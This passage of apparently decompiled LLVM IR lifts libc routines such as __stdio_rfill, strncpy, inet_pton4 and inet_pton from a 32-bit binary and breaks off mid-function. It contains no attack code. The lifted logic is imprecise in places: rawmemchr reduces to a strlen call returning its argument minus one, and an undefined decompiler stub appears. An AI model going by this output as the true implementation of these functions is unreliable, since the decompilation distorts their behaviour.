  %v2_804d21b = inttoptr i32 %v1_804d21b to i8*
  %v3_804d21b = load i8, i8* %v2_804d21b, align 1
  %v4_804d21b = urem i8 %v3_804d21b, 2
  %v5_804d21b = icmp eq i8 %v4_804d21b, 0
  %v1_804d21f = icmp eq i1 %v5_804d21b, false
  br i1 %v1_804d21f, label %dec_label_pc_804d21b.dec_label_pc_804d228_crit_edge, label %dec_label_pc_804d221

dec_label_pc_804d21b.dec_label_pc_804d228_crit_edge: ; preds = %dec_label_pc_804d21b
  %v0_804d228.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804d228

dec_label_pc_804d221:                             ; preds = %dec_label_pc_804d21b, %dec_label_pc_804d213
  %v0_804d221 = load i32, i32* %edx.global-to-local, align 4
  %v1_804d221 = add i32 %v0_804d221, 1
  store i32 %v1_804d221, i32* %edx.global-to-local, align 4
  %v0_804d222 = load i32, i32* @ecx, align 4
  %v1_804d222 = add i32 %v0_804d222, -1
  %v8_804d222 = icmp eq i32 %v1_804d222, 0
  store i32 %v1_804d222, i32* @ecx, align 4
  br i1 %v8_804d222, label %dec_label_pc_804d221.dec_label_pc_804d228_crit_edge, label %dec_label_pc_804d225

dec_label_pc_804d221.dec_label_pc_804d228_crit_edge: ; preds = %dec_label_pc_804d221
  %v1_804d228.pre = load i32, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804d228

dec_label_pc_804d225:                             ; preds = %dec_label_pc_804d221
  %v0_804d225 = load i32, i32* %esi.global-to-local, align 4
  %v1_804d225 = add i32 %v0_804d225, 1
  store i32 %v1_804d225, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804d213

dec_label_pc_804d228:                             ; preds = %dec_label_pc_804d221.dec_label_pc_804d228_crit_edge, %dec_label_pc_804d21b.dec_label_pc_804d228_crit_edge
  %v1_804d228 = phi i32 [ %v0_804d21b, %dec_label_pc_804d21b.dec_label_pc_804d228_crit_edge ], [ %v1_804d228.pre, %dec_label_pc_804d221.dec_label_pc_804d228_crit_edge ]
  %v0_804d228 = phi i32 [ %v0_804d228.pre, %dec_label_pc_804d21b.dec_label_pc_804d228_crit_edge ], [ %v1_804d221, %dec_label_pc_804d221.dec_label_pc_804d228_crit_edge ]
  %v2_804d228 = add i32 %v1_804d228, 16
  %v3_804d228 = inttoptr i32 %v2_804d228 to i32*
  store i32 %v0_804d228, i32* %v3_804d228, align 4
  %v0_804d22b = load i32, i32* %edx.global-to-local, align 4
  %v1_804d22b = load i32, i32* %edi.global-to-local, align 4
  %v2_804d22b = add i32 %v1_804d22b, 8
  %v3_804d22b = inttoptr i32 %v2_804d22b to i32*
  %v4_804d22b = load i32, i32* %v3_804d22b, align 4
  %v5_804d22b = sub i32 %v0_804d22b, %v4_804d22b
  store i32 %v5_804d22b, i32* %edx.global-to-local, align 4
  %v0_804d22e = load i32, i32* @ebx, align 4
  %v2_804d22e = sub i32 %v0_804d22e, %v5_804d22b
  br label %dec_label_pc_804d230

dec_label_pc_804d230:                             ; preds = %dec_label_pc_804d1fd, %dec_label_pc_804d228
  %v1_804d230 = phi i32 [ %v2_804d22e, %dec_label_pc_804d228 ], [ %v1_804d230.pre, %dec_label_pc_804d1fd ]
  %v0_804d230 = load i32, i32* %ebp.global-to-local, align 4
  %v2_804d230 = sub i32 %v0_804d230, %v1_804d230
  store i32 %v2_804d230, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804d232

dec_label_pc_804d1d6.dec_label_pc_804d232.loopexit_crit_edge: ; preds = %dec_label_pc_804d1f7
  %v0_804d232.pre.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804d232

dec_label_pc_804d232:                             ; preds = %entry, %dec_label_pc_804d1d6.dec_label_pc_804d232.loopexit_crit_edge, %dec_label_pc_804d230
  %v0_804d232 = phi i32 [ %v2_804d230, %dec_label_pc_804d230 ], [ %v0_804d232.pre.pre, %dec_label_pc_804d1d6.dec_label_pc_804d232.loopexit_crit_edge ], [ 0, %entry ]
  store i32 %v0_804d232, i32* %eax.global-to-local, align 4
  %v2_804d234 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804d234, i32* @ebx, align 4
  ret i32 %v0_804d232

; uselistorder directives
  uselistorder i32 %v0_804d232, { 1, 0 }
  uselistorder i32 %v1_804d225, { 1, 0 }
  uselistorder i32 %v1_804d222, { 1, 0 }
  uselistorder i32 %v1_804d221, { 0, 2, 1 }
  uselistorder i32 %v0_804d217, { 1, 0 }
  uselistorder i32 %v1_804d230.pre, { 1, 2, 0 }
  uselistorder i32 %v2_804d1f9, { 1, 0 }
  uselistorder i32 %v2_804d1f7, { 1, 2, 0 }
  uselistorder i32 %v5_804d1eb, { 0, 2, 1, 3 }
  uselistorder i32 %v0_804d1e4, { 1, 0 }
  uselistorder i32* %esi.global-to-local, { 0, 2, 4, 1, 3, 5 }
  uselistorder i32* %edx.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32* %edi.global-to-local, { 0, 4, 1, 2, 3, 5, 6 }
  uselistorder i32* %ebp.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32 (i32, i32*, i32)* @__GI_write, { 1, 0 }
  uselistorder i32 %arg3, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_804d232, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804d230, { 1, 0 }
  uselistorder label %dec_label_pc_804d213, { 1, 0 }
  uselistorder label %dec_label_pc_804d213.preheader, { 1, 0 }
}

define i32 @__stdio_rfill(i32 %arg1) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804d23c = load i32, i32* @ebx, align 4
  store i32 %v0_804d23c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_804d241 = add i32 %arg1, 8
  %v2_804d241 = inttoptr i32 %v1_804d241 to i32*
  %v3_804d241 = load i32, i32* %v2_804d241, align 4
  store i32 %v3_804d241, i32* %edx.global-to-local, align 4
  %v1_804d244 = add i32 %arg1, 12
  %v2_804d244 = inttoptr i32 %v1_804d244 to i32*
  %v3_804d244 = load i32, i32* %v2_804d244, align 4
  %v2_804d247 = sub i32 %v3_804d244, %v3_804d241
  %v3_804d24c = inttoptr i32 %arg1 to i16*
  %v4_804d24c = call i32 @__stdio_READ(i16* %v3_804d24c, i32 %v3_804d241, i32 %v2_804d247)
  %v0_804d251 = load i32, i32* @ebx, align 4
  %v1_804d251 = add i32 %v0_804d251, 8
  %v2_804d251 = inttoptr i32 %v1_804d251 to i32*
  %v3_804d251 = load i32, i32* %v2_804d251, align 4
  store i32 %v3_804d251, i32* %edx.global-to-local, align 4
  %v2_804d254 = add i32 %v0_804d251, 16
  %v3_804d254 = inttoptr i32 %v2_804d254 to i32*
  store i32 %v3_804d251, i32* %v3_804d254, align 4
  %v0_804d257 = load i32, i32* %edx.global-to-local, align 4
  %v2_804d257 = add i32 %v0_804d257, %v4_804d24c
  store i32 %v2_804d257, i32* %edx.global-to-local, align 4
  %v1_804d259 = load i32, i32* @ebx, align 4
  %v2_804d259 = add i32 %v1_804d259, 20
  %v3_804d259 = inttoptr i32 %v2_804d259 to i32*
  store i32 %v2_804d257, i32* %v3_804d259, align 4
  %v2_804d25f = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804d25f, i32* @ebx, align 4
  ret i32 %v4_804d24c

; uselistorder directives
  uselistorder i32 %v4_804d24c, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
}

define i32 @__stdio_trans2r_o(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_804d264 = load i32, i32* @ebx, align 4
  store i32 %v0_804d264, i32* %stack_var_-4, align 4
  %v4_804d265 = ptrtoint i16* %arg1 to i32
  store i32 %v4_804d265, i32* @ebx, align 4
  %v1_804d26d = bitcast i16* %arg1 to i32*
  %v2_804d26d = load i32, i32* %v1_804d26d, align 4
  %v1_804d26f = urem i32 %v2_804d26d, 65536
  %v2_804d272 = and i32 %v1_804d26f, %arg2
  %v3_804d272 = icmp eq i32 %v2_804d272, 0
  %v1_804d274 = icmp eq i1 %v3_804d272, false
  br i1 %v1_804d274, label %dec_label_pc_804d283, label %dec_label_pc_804d276

dec_label_pc_804d276:                             ; preds = %entry
  %v1_804d276 = and i32 %v2_804d26d, 2176
  %v2_804d276 = icmp eq i32 %v1_804d276, 0
  %v1_804d27c = icmp eq i1 %v2_804d276, false
  br i1 %v1_804d27c, label %dec_label_pc_804d28a, label %dec_label_pc_804d27e

dec_label_pc_804d27e:                             ; preds = %dec_label_pc_804d276
  %v2_804d27e = or i32 %v2_804d26d, %arg2
  %v1_804d280 = trunc i32 %v2_804d27e to i16
  store i16 %v1_804d280, i16* %arg1, align 2
  %v0_804d283.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804d283

dec_label_pc_804d283:                             ; preds = %entry, %dec_label_pc_804d27e
  %v0_804d2a2 = phi i32 [ %v4_804d265, %entry ], [ %v0_804d283.pre, %dec_label_pc_804d27e ]
  %v1_804d283 = inttoptr i32 %v0_804d2a2 to i16*
  %v2_804d283 = load i16, i16* %v1_804d283, align 2
  %v2_804d286 = and i16 %v2_804d283, 16
  %v3_804d286 = icmp eq i16 %v2_804d286, 0
  br i1 %v3_804d286, label %dec_label_pc_804d29e, label %dec_label_pc_804d28a

dec_label_pc_804d28a:                             ; preds = %dec_label_pc_804d283, %dec_label_pc_804d276
  %v1_804d28a = call i32 @__GI___errno_location(i32 %v0_804d264)
  %v1_804d28f = inttoptr i32 %v1_804d28a to i32*
  store i32 9, i32* %v1_804d28f, align 4
  br label %dec_label_pc_804d295

dec_label_pc_804d295:                             ; preds = %dec_label_pc_804d2a2, %dec_label_pc_804d28a
  %v0_804d295 = load i32, i32* @ebx, align 4
  %v1_804d295 = inttoptr i32 %v0_804d295 to i16*
  %v2_804d295 = load i16, i16* %v1_804d295, align 2
  %v3_804d295 = or i16 %v2_804d295, 8
  store i16 %v3_804d295, i16* %v1_804d295, align 2
  br label %dec_label_pc_804d2bd

dec_label_pc_804d29e:                             ; preds = %dec_label_pc_804d283
  %v2_804d29e = and i16 %v2_804d283, 64
  %v3_804d29e = icmp eq i16 %v2_804d29e, 0
  br i1 %v3_804d29e, label %dec_label_pc_804d2b7, label %dec_label_pc_804d2a2

dec_label_pc_804d2a2:                             ; preds = %dec_label_pc_804d29e
  %v2_804d2a3 = call i32 @__stdio_wcommit(i32 %v0_804d2a2)
  %v1_804d2a9 = icmp eq i32 %v2_804d2a3, 0
  %v1_804d2ab = icmp eq i1 %v1_804d2a9, false
  br i1 %v1_804d2ab, label %dec_label_pc_804d295, label %dec_label_pc_804d2ad

dec_label_pc_804d2ad:                             ; preds = %dec_label_pc_804d2a2
  %v0_804d2ad = load i32, i32* @ebx, align 4
  %v1_804d2ad = add i32 %v0_804d2ad, 8
  %v2_804d2ad = inttoptr i32 %v1_804d2ad to i32*
  %v3_804d2ad = load i32, i32* %v2_804d2ad, align 4
  %v2_804d2b0 = add i32 %v0_804d2ad, 28
  %v3_804d2b0 = inttoptr i32 %v2_804d2b0 to i32*
  store i32 %v3_804d2ad, i32* %v3_804d2b0, align 4
  %v0_804d2b3 = load i32, i32* @ebx, align 4
  %v1_804d2b3 = inttoptr i32 %v0_804d2b3 to i16*
  %v2_804d2b3 = load i16, i16* %v1_804d2b3, align 2
  %v3_804d2b3 = and i16 %v2_804d2b3, -65
  store i16 %v3_804d2b3, i16* %v1_804d2b3, align 2
  %v0_804d2b7.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804d2b7

dec_label_pc_804d2b7:                             ; preds = %dec_label_pc_804d29e, %dec_label_pc_804d2ad
  %v9_804d2b7 = phi i32 [ %v0_804d2a2, %dec_label_pc_804d29e ], [ %v0_804d2b7.pre, %dec_label_pc_804d2ad ]
  %v1_804d2b7 = inttoptr i32 %v9_804d2b7 to i16*
  %v2_804d2b7 = load i16, i16* %v1_804d2b7, align 2
  %v3_804d2b7 = or i16 %v2_804d2b7, 1
  store i16 %v3_804d2b7, i16* %v1_804d2b7, align 2
  br label %dec_label_pc_804d2bd

dec_label_pc_804d2bd:                             ; preds = %dec_label_pc_804d295, %dec_label_pc_804d2b7
  %storemerge = phi i32 [ 0, %dec_label_pc_804d2b7 ], [ -1, %dec_label_pc_804d295 ]
  %v2_804d2bd = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804d2bd, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_804d26d, { 1, 2, 0 }
  uselistorder i16* %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804d2bd, { 1, 0 }
  uselistorder label %dec_label_pc_804d2b7, { 1, 0 }
  uselistorder label %dec_label_pc_804d283, { 1, 0 }
}

define i32 @rawmemchr(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_804d2c1 = ptrtoint i8* %arg1 to i32
  %v3_804d2cc = call i32 @_strlen(i8* %arg1)
  %v2_804d2ce = add i32 %v4_804d2c1, -1
  ret i32 %v2_804d2ce

; uselistorder directives
  uselistorder i8* %arg1, { 1, 0 }
}

define i32 @strncpy(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804d2d5 = load i32, i32* @esi, align 4
  store i32 %v0_804d2d5, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_804d2e1 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804d2e1, i32* %edi.global-to-local, align 4
  %v1_804d2e512 = add i32 %arg3, -1
  %v5_804d2e513 = icmp eq i32 %arg3, 0
  store i32 %v1_804d2e512, i32* %ecx.global-to-local, align 4
  br i1 %v5_804d2e513, label %.loopexit, label %dec_label_pc_804d2ea.lr.ph

dec_label_pc_804d2ea.lr.ph:                       ; preds = %entry
  %v10_804d2ea.pre = load i1, i1* @df, align 1
  br label %dec_label_pc_804d2ea

dec_label_pc_804d2ea:                             ; preds = %dec_label_pc_804d2ea.dec_label_pc_804d2e5_crit_edge.dec_label_pc_804d2ea_crit_edge, %dec_label_pc_804d2ea.lr.ph
  %v10_804d2ea = phi i1 [ %v10_804d2ea.pre, %dec_label_pc_804d2ea.lr.ph ], [ %v6_804d2eb, %dec_label_pc_804d2ea.dec_label_pc_804d2e5_crit_edge.dec_label_pc_804d2ea_crit_edge ]
  %v0_804d2ea = phi i32 [ %arg2, %dec_label_pc_804d2ea.lr.ph ], [ %v0_804d2ea.pre, %dec_label_pc_804d2ea.dec_label_pc_804d2e5_crit_edge.dec_label_pc_804d2ea_crit_edge ]
  %v3_804d2eb15 = phi i32 [ %v4_804d2e1, %dec_label_pc_804d2ea.lr.ph ], [ %v8_804d2eb, %dec_label_pc_804d2ea.dec_label_pc_804d2e5_crit_edge.dec_label_pc_804d2ea_crit_edge ]
  %v1_804d2ea = inttoptr i32 %v0_804d2ea to i8*
  %v2_804d2ea = load i8, i8* %v1_804d2ea, align 1
  %v11_804d2ea = select i1 %v10_804d2ea, i32 -1, i32 1
  %v12_804d2ea = add i32 %v11_804d2ea, %v0_804d2ea
  store i32 %v12_804d2ea, i32* %esi.global-to-local, align 4
  %v4_804d2eb = inttoptr i32 %v3_804d2eb15 to i8*
  store i8 %v2_804d2ea, i8* %v4_804d2eb, align 1
  %v5_804d2eb = load i32, i32* %edi.global-to-local, align 4
  %v6_804d2eb = load i1, i1* @df, align 1
  %v7_804d2eb = select i1 %v6_804d2eb, i32 -1, i32 1
  %v8_804d2eb = add i32 %v7_804d2eb, %v5_804d2eb
  store i32 %v8_804d2eb, i32* %edi.global-to-local, align 4
  %v6_804d2ec = icmp eq i8 %v2_804d2ea, 0
  %v1_804d2ee = icmp eq i1 %v6_804d2ec, false
  br i1 %v1_804d2ee, label %dec_label_pc_804d2ea.dec_label_pc_804d2e5_crit_edge, label %dec_label_pc_804d2f0

dec_label_pc_804d2ea.dec_label_pc_804d2e5_crit_edge: ; preds = %dec_label_pc_804d2ea
  %v0_804d2e5.pre = load i32, i32* %ecx.global-to-local, align 4
  %v1_804d2e5 = add i32 %v0_804d2e5.pre, -1
  %v5_804d2e5 = icmp eq i32 %v0_804d2e5.pre, 0
  store i32 %v1_804d2e5, i32* %ecx.global-to-local, align 4
  br i1 %v5_804d2e5, label %.loopexit, label %dec_label_pc_804d2ea.dec_label_pc_804d2e5_crit_edge.dec_label_pc_804d2ea_crit_edge

dec_label_pc_804d2ea.dec_label_pc_804d2e5_crit_edge.dec_label_pc_804d2ea_crit_edge: ; preds = %dec_label_pc_804d2ea.dec_label_pc_804d2e5_crit_edge
  %v0_804d2ea.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804d2ea

dec_label_pc_804d2f0:                             ; preds = %dec_label_pc_804d2ea
  %v2_804d2f0 = sext i8 %v2_804d2ea to i32
  %v3_804d2f0 = load i32, i32* %ecx.global-to-local, align 4
  %v4_804d2f0 = inttoptr i32 %v8_804d2eb to i8*
  %v5_804d2f0 = call i8* @_memset(i8* %v4_804d2f0, i32 %v2_804d2f0, i32 %v3_804d2f0)
  %v6_804d2f0 = ptrtoint i8* %v5_804d2f0 to i32
  store i32 %v6_804d2f0, i32* %ecx.global-to-local, align 4
  br label %.loopexit

.loopexit:                                        ; preds = %entry, %dec_label_pc_804d2ea.dec_label_pc_804d2e5_crit_edge, %dec_label_pc_804d2f0
  %v2_804d2f7 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804d2f7, i32* @esi, align 4
  ret i32 %v4_804d2e1

; uselistorder directives
  uselistorder i32 %v8_804d2eb, { 0, 2, 1 }
  uselistorder i1 %v6_804d2eb, { 1, 0 }
  uselistorder i8 %v2_804d2ea, { 0, 2, 1 }
  uselistorder i32 %v0_804d2ea, { 1, 0 }
  uselistorder i32 %v4_804d2e1, { 1, 0, 2 }
  uselistorder i32* %ecx.global-to-local, { 1, 2, 4, 3, 0 }
  uselistorder label %.loopexit, { 2, 1, 0 }
}

define i32 @inet_pton4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v15_804d300 = ptrtoint i32* %stack_var_-20 to i32
  %v0_804d303 = load i32, i32* @eax, align 4
  store i32 %v0_804d303, i32* %ebx.global-to-local, align 4
  %v0_804d305 = load i32, i32* @edx, align 4
  store i32 %v0_804d305, i32* %ebp.global-to-local, align 4
  store i32 0, i32* %stack_var_-20, align 4
  store i32 0, i32* %edi.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 %v15_804d300, i32* %esi.global-to-local, align 4
  %v1_804d35311 = inttoptr i32 %v0_804d303 to i8*
  %v2_804d35312 = load i8, i8* %v1_804d35311, align 1
  %v3_804d35313 = zext i8 %v2_804d35312 to i32
  %v5_804d35314 = and i32 %v0_804d303, -256
  %v6_804d35315 = or i32 %v3_804d35313, %v5_804d35314
  store i32 %v6_804d35315, i32* %eax.global-to-local, align 4
  %v4_804d35516 = icmp eq i8 %v2_804d35312, 0
  %v1_804d35717 = icmp eq i1 %v4_804d35516, false
  br i1 %v1_804d35717, label %dec_label_pc_804d313, label %dec_label_pc_804d359.thread

dec_label_pc_804d359.thread:                      ; preds = %entry
  br label %dec_label_pc_804d36b

dec_label_pc_804d313:                             ; preds = %entry, %dec_label_pc_804d353.backedge
  %v3_804d35321 = phi i32 [ %v3_804d353, %dec_label_pc_804d353.backedge ], [ %v3_804d35313, %entry ]
  %v2_804d35320 = phi i8 [ %v2_804d353, %dec_label_pc_804d353.backedge ], [ %v2_804d35312, %entry ]
  %v0_804d31619 = phi i32 [ %v0_804d353.pre, %dec_label_pc_804d353.backedge ], [ %v0_804d303, %entry ]
  %v0_804d34418 = phi i32 [ %v0_804d3445, %dec_label_pc_804d353.backedge ], [ 0, %entry ]
  store i32 %v3_804d35321, i32* %eax.global-to-local, align 4
  %v1_804d316 = add i32 %v0_804d31619, 1
  store i32 %v1_804d316, i32* %ebx.global-to-local, align 4
  %v1_804d317 = add nsw i32 %v3_804d35321, -48
  store i32 %v1_804d317, i32* @ecx, align 4
  %v6_804d31d = icmp ugt i32 %v1_804d317, 9
  br i1 %v6_804d31d, label %dec_label_pc_804d33f, label %dec_label_pc_804d31f

dec_label_pc_804d31f:                             ; preds = %dec_label_pc_804d313
  %v0_804d31f = load i32, i32* %esi.global-to-local, align 4
  %v1_804d31f = inttoptr i32 %v0_804d31f to i8*
  %v2_804d31f = load i8, i8* %v1_804d31f, align 1
  %v2_804d322 = zext i8 %v2_804d31f to i32
  %v3_804d322 = mul nuw nsw i32 %v2_804d322, 10
  %v2_804d325 = add nsw i32 %v3_804d322, %v1_804d317
  store i32 %v2_804d325, i32* %eax.global-to-local, align 4
  %v6_804d32d = icmp ugt i32 %v2_804d325, 255
  br i1 %v6_804d32d, label %dec_label_pc_804d36b, label %dec_label_pc_804d32f

dec_label_pc_804d32f:                             ; preds = %dec_label_pc_804d31f
  %v1_804d32f = trunc i32 %v2_804d325 to i8
  store i8 %v1_804d32f, i8* %v1_804d31f, align 1
  %v0_804d331 = load i32, i32* %edx.global-to-local, align 4
  %v1_804d331 = icmp eq i32 %v0_804d331, 0
  %v1_804d333 = icmp eq i1 %v1_804d331, false
  br i1 %v1_804d333, label %dec_label_pc_804d353.backedge, label %dec_label_pc_804d335

dec_label_pc_804d335:                             ; preds = %dec_label_pc_804d32f
  %v0_804d335 = load i32, i32* %edi.global-to-local, align 4
  %v1_804d335 = add i32 %v0_804d335, 1
  store i32 %v1_804d335, i32* %edi.global-to-local, align 4
  %v1_804d336 = add i32 %v0_804d335, -3
  %v6_804d336 = sub i32 2, %v0_804d335
  %v7_804d336 = and i32 %v6_804d336, %v1_804d335
  %v8_804d336 = icmp slt i32 %v7_804d336, 0
  %v9_804d336 = icmp eq i32 %v1_804d336, 0
  %v10_804d336 = icmp slt i32 %v1_804d336, 0
  %v3_804d339 = icmp eq i1 %v10_804d336, %v8_804d336
  %v4_804d339 = icmp eq i1 %v9_804d336, false
  %v5_804d339 = and i1 %v4_804d339, %v3_804d339
  br i1 %v5_804d339, label %dec_label_pc_804d36b, label %dec_label_pc_804d33b

dec_label_pc_804d33b:                             ; preds = %dec_label_pc_804d335
  %v1_804d33b = and i32 %v0_804d331, -256
  %v2_804d33b = or i32 %v1_804d33b, 1
  store i32 %v2_804d33b, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804d353.backedge

dec_label_pc_804d33f:                             ; preds = %dec_label_pc_804d313
  %v9_804d33f = icmp eq i8 %v2_804d35320, 46
  %v1_804d342 = icmp eq i1 %v9_804d33f, false
  br i1 %v1_804d342, label %dec_label_pc_804d36b, label %dec_label_pc_804d344

dec_label_pc_804d344:                             ; preds = %dec_label_pc_804d33f
  %v1_804d344 = icmp eq i32 %v0_804d34418, 0
  br i1 %v1_804d344, label %dec_label_pc_804d36b, label %dec_label_pc_804d348

dec_label_pc_804d348:                             ; preds = %dec_label_pc_804d344
  %v0_804d348 = load i32, i32* %edi.global-to-local, align 4
  %v9_804d348 = icmp eq i32 %v0_804d348, 4
  br i1 %v9_804d348, label %dec_label_pc_804d36b, label %dec_label_pc_804d34d

dec_label_pc_804d34d:                             ; preds = %dec_label_pc_804d348
  %v0_804d34d = load i32, i32* %esi.global-to-local, align 4
  %v1_804d34d = add i32 %v0_804d34d, 1
  store i32 %v1_804d34d, i32* %esi.global-to-local, align 4
  %v1_804d34e = inttoptr i32 %v1_804d34d to i8*
  store i8 0, i8* %v1_804d34e, align 1
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804d353.backedge

dec_label_pc_804d353.backedge:                    ; preds = %dec_label_pc_804d34d, %dec_label_pc_804d33b, %dec_label_pc_804d32f
  %v0_804d3445 = phi i32 [ 0, %dec_label_pc_804d34d ], [ %v2_804d33b, %dec_label_pc_804d33b ], [ %v0_804d331, %dec_label_pc_804d32f ]
  %v0_804d353.pre = load i32, i32* %ebx.global-to-local, align 4
  %v4_804d353.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_804d353 = inttoptr i32 %v0_804d353.pre to i8*
  %v2_804d353 = load i8, i8* %v1_804d353, align 1
  %v3_804d353 = zext i8 %v2_804d353 to i32
  %v5_804d353 = and i32 %v4_804d353.pre, -256
  %v6_804d353 = or i32 %v3_804d353, %v5_804d353
  store i32 %v6_804d353, i32* %eax.global-to-local, align 4
  %v4_804d355 = icmp eq i8 %v2_804d353, 0
  %v1_804d357 = icmp eq i1 %v4_804d355, false
  br i1 %v1_804d357, label %dec_label_pc_804d313, label %dec_label_pc_804d359

dec_label_pc_804d359:                             ; preds = %dec_label_pc_804d353.backedge
  %v0_804d359.pre = load i32, i32* %edi.global-to-local, align 4
  %v7_804d35c = icmp sgt i32 %v0_804d359.pre, 3
  br i1 %v7_804d35c, label %dec_label_pc_804d35e, label %dec_label_pc_804d36b

dec_label_pc_804d35e:                             ; preds = %dec_label_pc_804d359
  %v2_804d35e = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_804d35e, i32* %eax.global-to-local, align 4
  %v1_804d361 = load i32, i32* %ebp.global-to-local, align 4
  %v2_804d361 = inttoptr i32 %v1_804d361 to i32*
  store i32 %v2_804d35e, i32* %v2_804d361, align 4
  br label %dec_label_pc_804d36d

dec_label_pc_804d36b:                             ; preds = %dec_label_pc_804d348, %dec_label_pc_804d344, %dec_label_pc_804d33f, %dec_label_pc_804d335, %dec_label_pc_804d31f, %dec_label_pc_804d359.thread, %dec_label_pc_804d359
  br label %dec_label_pc_804d36d

dec_label_pc_804d36d:                             ; preds = %dec_label_pc_804d35e, %dec_label_pc_804d36b
  %storemerge = phi i32 [ 1, %dec_label_pc_804d35e ], [ 0, %dec_label_pc_804d36b ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v2_804d36d = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_804d36d, i32* %edx.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v3_804d353, { 1, 0 }
  uselistorder i8 %v2_804d353, { 1, 2, 0 }
  uselistorder i32 %v0_804d353.pre, { 1, 0 }
  uselistorder i32 %v1_804d336, { 1, 0 }
  uselistorder i32* %edi.global-to-local, { 2, 1, 0, 3, 4 }
  uselistorder i32* %eax.global-to-local, { 2, 1, 6, 4, 3, 5, 0 }
  uselistorder label %dec_label_pc_804d36d, { 1, 0 }
  uselistorder label %dec_label_pc_804d36b, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_804d313, { 1, 0 }
}

define i32 @inet_pton(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp45 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804d373 = load i32, i32* @ebp, align 4
  %v0_804d374 = load i32, i32* @edi, align 4
  %v0_804d375 = load i32, i32* @esi, align 4
  %v0_804d376 = load i32, i32* @ebx, align 4
  store i32 %v0_804d376, i32* %stack_var_-16, align 4
  %v4_804d376 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v4_804d37e = ptrtoint i8* %arg2 to i32
  store i32 %v4_804d37e, i32* @esi, align 4
  %v9_804d382 = icmp eq i32 %arg1, 2
  br i1 %v9_804d382, label %dec_label_pc_804d392, label %dec_label_pc_804d387

dec_label_pc_804d387:                             ; preds = %entry
  %v9_804d387 = icmp eq i32 %arg1, 10
  %v1_804d38a = icmp eq i1 %v9_804d387, false
  br i1 %v1_804d38a, label %dec_label_pc_804d530, label %dec_label_pc_804d3a2

dec_label_pc_804d392:                             ; preds = %entry
  store i32 %tmp45, i32* @edx, align 4
  store i32 %v4_804d37e, i32* @eax, align 4
  %v3_804d398 = call i32 @inet_pton4(i32 %v0_804d376, i32 %v0_804d375, i32 %v0_804d374)
  store i32 %v3_804d398, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d53e

dec_label_pc_804d3a2:                             ; preds = %dec_label_pc_804d387
  store i32 0, i32* %eax.global-to-local, align 4
  %v2_804d3a4 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804d3a4, i32* %edx.global-to-local, align 4
  store i32 0, i32* %stack_var_-32, align 4
  %v4_804d3aa = load i1, i1* @df, align 1
  %v5_804d3aa = select i1 %v4_804d3aa, i32 -4, i32 4
  %v6_804d3aa = add i32 %v5_804d3aa, %v2_804d3a4
  store i32 %v6_804d3aa, i32* %edi.global-to-local, align 4
  %v2_804d3ab = inttoptr i32 %v6_804d3aa to i32*
  store i32 0, i32* %v2_804d3ab, align 4
  %v3_804d3ab = load i32, i32* %edi.global-to-local, align 4
  %v6_804d3ab = add i32 %v3_804d3ab, %v5_804d3aa
  store i32 %v6_804d3ab, i32* %edi.global-to-local, align 4
  %v0_804d3ac = load i32, i32* %eax.global-to-local, align 4
  %v2_804d3ac = inttoptr i32 %v6_804d3ab to i32*
